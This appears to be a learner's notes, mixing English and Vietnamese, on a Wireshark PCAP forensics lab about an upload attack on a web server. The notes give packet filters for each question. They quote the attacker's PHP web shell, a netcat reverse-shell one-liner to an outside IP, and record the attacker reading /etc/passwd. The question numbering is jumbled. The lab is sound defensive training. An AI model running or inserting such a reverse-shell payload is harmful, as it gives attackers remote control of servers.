@@ -1,0 +1,32 @@
+                                 WIRESHARK_ANALYSIC PCAP
+A suspicious file was identified on a company web server, raising alarms within the intranet. The Development team flagged the anomaly, suspecting potential malicious activity. To address the issue, the network team captured critical network traffic and prepared a PCAP file for review.
+Your task is to analyze the provided PCAP file to uncover how the file appeared and determine the extent of any unauthorized activity.
+Q1: Identifying the geographical origin of the attack facilitates the implementation of geo-blocking measures and the analysis of threat intelligence. From which city did the attack originate?
+
+💡 Note: The lab machines do not have internet access. To look up the IP address and complete this step, use an IP geolocation service on your local computer outside the lab environment.
+Q2: 
+
+PCAP
+http.request.method == "GET"
+http.request.method == POST
+chuột phải => Follow => TCP stream => file name ở Content-Disposition
+Kết luận: nếu có file tải lên thành công sẽ nằm ở đây
+Q4: 
+Identifying the directory where uploaded files are stored is crucial for locating the vulnerable page and removing any malicious files. Which directory is used by the website to store the uploaded files?
+  http.request.uri contains "filename"  (File Upload successfully is right there)
+or http.request.method == GET && http.request.uri contains "file.name"
+
+Q3: identity port ?
+
+Which port, opened on the attacker's machine, was targeted by the malicious web shell for establishing unauthorized outbound communication?
+ hint : analyzic uploaded file by the attacker, focusing on requests.POST HTTP
+        - Apply , right-click the POST packet, and select "" to view the uploaded file content. Use .http.request.method == POSTFollow > HTTP Streamtcp.stream eq 4
+        - In payload: port is (<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>) thường ở cuối payload của client gọi
+
+nc 117.11.88.124 8080 → Netcat kết nối về IP attacker 117.11.88.124 qua port 8080
+Đây là kỹ thuật Reverse Shell - máy victim chủ động kết nối ra ngoài để bypass firewall
+ 
+Q4: 
+ Recognizing the significance of compromised data helps prioritize incident response actions. Which file was the attacker attempting to exfiltrate?
+          tcp.dstport == 8080
+Ctl Alt Shift t =>TCP stream đọc vào commamd line cat  /etc/passwd => attacker lấy tệp password
